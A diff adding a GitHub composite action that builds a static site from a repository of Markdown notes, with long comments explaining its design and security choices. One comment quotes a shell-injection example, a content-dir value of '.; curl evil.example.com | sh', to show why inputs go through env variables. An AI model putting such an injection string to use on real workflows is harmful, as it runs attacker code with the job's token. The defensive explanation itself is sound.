@@ -1,0 +1,218 @@
+# The action a stranger adds to their own notes repository.
+#
+# This is NOT `.github/workflows/verify.yml`, which is this repository's own CI
+# and runs this repository's own gates. This file is a *composite action*: it has
+# no triggers and never runs on its own, and it exists to be named by somebody
+# else's workflow as
+#
+#     - uses: <owner>/<repo>@v1
+#
+# It builds the site and stops. It does not deploy, does not push, and does not
+# write anything into the user's repository — the deploy step belongs to the
+# user's own workflow, where they can see it, and `docs/adoption.md` shows it.
+#
+# ## How the generator gets here today, and where its name lives
+#
+# `package.json` carries `"private": true`, so this package is on no registry and
+# `npx` resolves nothing for it. **It will be published, but under a different
+# name than it has now** — the rename is the owner's and has not happened. So
+# this action is built to need neither: it depends on no registry today, and the
+# rename must be a single edit rather than a search.
+#
+# **What makes that work is a property of `uses:` rather than a workaround.**
+# When a workflow names an action by repository, the runner checks that whole
+# repository out at `$GITHUB_ACTION_PATH` before the first step runs. This file
+# sits at the root of the generator's own repository, so the generator's complete
+# source — `bin/`, `scripts/`, `src/`, `astro.config.mjs` — is already on disk
+# next to it, at the exact commit the user's `@v1` resolves to. Nothing needs
+# fetching from a registry, and the version pin plan §5.3 asks for is the git ref
+# the user wrote, which is one pin rather than two.
+#
+# The `.ts` sources run directly: Node strips types from a plain checkout, and
+# refuses to only under `node_modules` — which is why the tarball is compiled and
+# why this path does not have to be. Measured end to end on a foreign notes
+# directory from a `git archive` checkout of this repository: `4 discovered,
+# 2 published, 2 dropped`, a complete site, with the configured exclusion honoured.
+#
+# **The package name appears nowhere in this file, and that is the design.** The
+# binary is located by reading `package.json`'s `bin` key out of the checkout
+# rather than by writing its filename here — that key is the one place a package
+# name and its entry point are tied together, so a rename touches the manifest
+# and nothing else. `tests/adoption.test.ts` holds the property by reading the
+# name from the manifest and asserting it is absent here, which keeps working
+# through the rename rather than pinning the name it exists to remove.
+#
+# **On the day it is published**, the install step below is deleted and the build
+# step's `run:` becomes `npx <the-published-name>@<version> build …`. That is the
+# first time this file would carry the name, and it is one line. Until then the
+# name a user types is the repository in their own `uses:` line, which is a git
+# coordinate and not a package name — so adoption today survives the rename,
+# while adoption *after* publishing does not: a user's committed workflow would
+# name the old package. Whoever writes the release process owns that ordering.
+#
+# ## What this may print
+#
+# A public notes repository's workflow log is world-readable and retained for 90
+# days, so a withheld note's path — or merely its basename — is an index to it.
+# Every line this file composes is a literal written here; the counts come from
+# the binary, which composes its own lines under the same rule and puts the names
+# in a report under the git directory that no `git add` can reach.
+#
+# The two commands that are not ours are `git rev-parse`, which answers `true` or
+# `false`, and `npm install`, silenced to `--loglevel=error`. npm's own failure
+# output does carry paths, and they are paths into the *action's* dependency tree
+# on the runner — never the user's notes, which npm never reads. A dependency
+# install that fails silently would be the worse trade.
+
+name: Publish a site from a directory of Markdown
+description: >-
+  Builds a static site — prerendered pages, full-text search, backlinks — from
+  the Markdown in this repository. Publishes everything except what you exclude.
+
+inputs:
+  content-dir:
+    description: The directory holding the Markdown, relative to the repository root.
+    required: false
+    default: .
+  out-dir:
+    description: Where to write the site. Replaced wholesale on every build.
+    required: false
+    default: dist
+
+# Three inputs the plan's §5.1 names are deliberately absent, because each would
+# be a second way to say something this tool already has one way to say:
+#
+# - `config`, a path to the configuration file. `scripts/load-config.ts` has one
+#   filename and no search order, on the stated reasoning that a search order is
+#   a place for a file to be silently not found — and it refuses a near-miss
+#   spelling by name rather than accepting it. An input redirecting it would
+#   reintroduce exactly that, in YAML, where the loader's refusal cannot reach.
+# - `generator-version`. The generator is this checkout, so its version is the
+#   ref the user wrote in `uses:`. A second pin can disagree with the first.
+# - `fail-on-new`, which gates a published-slug addition against a committed
+#   publish manifest. **No manifest exists anywhere in this tree.** An input
+#   whose behaviour is unimplemented is worse than an absent one: a user reading
+#   the table would believe the acknowledgement step is protecting them.
+
+runs:
+  using: composite
+  steps:
+    # First, because it is the one failure that produces a *valid-looking wrong
+    # site* rather than an error. `actions/checkout` defaults to `fetch-depth: 1`,
+    # so this fires for anyone who has not set `fetch-depth: 0` — which is the
+    # point: it makes the documented setting non-optional rather than advisory.
+    #
+    # Stated honestly, because a reader will otherwise assume it is load-bearing
+    # today: **the producer derives no dates from git at present.** `created` and
+    # `updated` are unset, so a shallow clone currently costs nothing. This check
+    # is here for the commit that changes that, since the alternative is somebody
+    # remembering to add it on the day it starts mattering, and the failure it
+    # guards against is silent.
+    - name: Refuse a shallow clone
+      shell: bash
+      run: |
+        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
+          echo "::error::This repository was cloned shallowly, so commit dates are unavailable." >&2
+          echo "Add fetch-depth: 0 to the actions/checkout step in this workflow:" >&2
+          echo "" >&2
+          echo "      - uses: actions/checkout@v5" >&2
+          echo "        with:" >&2
+          echo "          fetch-depth: 0" >&2
+          exit 1
+        fi
+
+    # Node's version is checked rather than installed, and the floor is read from
+    # the generator's own `engines` rather than written here — a literal here
+    # would be a third pin, after `engines` and `.nvmrc`, and the three would
+    # drift. A runner's default Node is whatever the image ships; below the floor
+    # the failure is otherwise a syntax error inside a dependency, which tells a
+    # stranger nothing about what to change.
+    - name: Check the Node version
+      shell: bash
+      run: |
+        node -e '
+          const { readFileSync } = require("node:fs");
+          const manifest = JSON.parse(readFileSync(process.env.GITHUB_ACTION_PATH + "/package.json", "utf8"));
+          const floor = /^>=\s*(\d+)\.(\d+)\.(\d+)/.exec(manifest.engines.node);
+          if (!floor) throw new Error("the generator declares no engines.node floor");
+          const wanted = floor.slice(1).map(Number);
+          const found = process.versions.node.split(".").map(Number);
+          for (let i = 0; i < 3; i += 1) {
+            if (found[i] > wanted[i]) break;
+            if (found[i] < wanted[i]) {
+              console.error("::error::Node " + process.versions.node + " is too old to build this site; " +
+                manifest.engines.node + " is required.");
+              console.error("Add a setup-node step before this action:");
+              console.error("");
+              console.error("      - uses: actions/setup-node@v5");
+              console.error("        with:");
+              console.error("          node-version: 24");
+              process.exit(1);
+            }
+          }
+        '
+
+    # `npm`, not `pnpm`, and the reason is a measured constraint rather than a
+    # preference. `AGENTS.md` names pnpm as this repository's package manager, and
+    # `pnpm/setup` reads the pin from `packageManager` — but its `package-json-file`
+    # input is documented as resolved **relative to `GITHUB_WORKSPACE`**, and
+    # `$GITHUB_ACTION_PATH` is not inside the workspace. So the action that would
+    # honour the pin cannot see the file carrying it. npm ships with every Node on
+    # every runner and needs no setup step at all.
+    #
+    # The consequence, named rather than hidden: `npm install` ignores
+    # `pnpm-lock.yaml` and resolves the caret ranges in `package.json` fresh, so a
+    # dependency's new minor can reach a user's build without any diff in their
+    # repository. That is the caveat plan §5.3 attaches to version pinning, one
+    # layer down — the *generator* is pinned exactly, by the ref in `uses:`; its
+    # dependency tree is not. Closing it means committing a `package-lock.json`
+    # for a repository that installs with pnpm, which is a second lockfile and its
+    # own drift; it is left open deliberately and belongs to whoever publishes the
+    # package, since `npx` on a published version has the same property.
+    #
+    # `--omit=dev` because a user's build needs none of the gates. Measured on a
+    # `git archive` checkout of this repository, a production install leaves
+    # `astro`, `pagefind`, and `yaml` present and `vitest`, `typescript`, and
+    # `@astrojs/check` absent — and the build runs.
+    - name: Install the generator's dependencies
+      shell: bash
+      working-directory: ${{ github.action_path }}
+      run: npm install --omit=dev --no-audit --no-fund --loglevel=error
+
+    # The one step that reads the user's notes. Every path here is the user's own
+    # input echoed back into an argument, never into the log: the binary prints
+    # counts, and the two directories are quoted so one with a space in it stays
+    # one argument.
+    #
+    # **The binary is located through `package.json`'s `bin` key rather than by
+    # its filename.** That key is the one place a package's name and its entry
+    # point are tied together, and this package is going to be renamed before it
+    # is published — so a filename written here would be a second place the
+    # rename has to find. `node -p` reads it out of the manifest that ships
+    # beside this file in the same checkout. The value is a literal of the
+    # generator's own manifest, not user input, so it is not the injection class
+    # the paragraph below is about.
+    #
+    # **The inputs reach the shell through `env:`, never through `${{ }}` inside
+    # `run:`.** An expression interpolated into a script is substituted as *text*
+    # before bash parses it, so a `content-dir` of `.; curl evil.example.com | sh`
+    # is not a directory that fails to exist — it is a second command, running
+    # with whatever the job's token can do. It is the standard GitHub Actions
+    # injection, and the fact that this input usually comes from the user's own
+    # workflow file is not a defence: `content-dir: ${{ github.event.inputs.dir }}`
+    # is a plausible thing for a user to write on a `workflow_dispatch`, and then
+    # the value is a stranger's. An environment variable is passed as data and is
+    # never parsed as script.
+    #
+    # `working-directory` is the workspace rather than the action path, because
+    # `build` resolves a relative `--content` and `--out` against the directory it
+    # was run in, and reads `publish.config.yaml` from the content directory.
+    - name: Build the site
+      shell: bash
+      working-directory: ${{ github.workspace }}
+      env:
+        PUBLISH_CONTENT_DIR: ${{ inputs.content-dir }}
+        PUBLISH_OUT_DIR: ${{ inputs.out-dir }}
+      run: |
+        entry="$(node -p 'const m=require(process.env.GITHUB_ACTION_PATH+"/package.json"); Object.values(m.bin)[0]')"
+        node "$GITHUB_ACTION_PATH/$entry" build --content "$PUBLISH_CONTENT_DIR" --out "$PUBLISH_OUT_DIR"
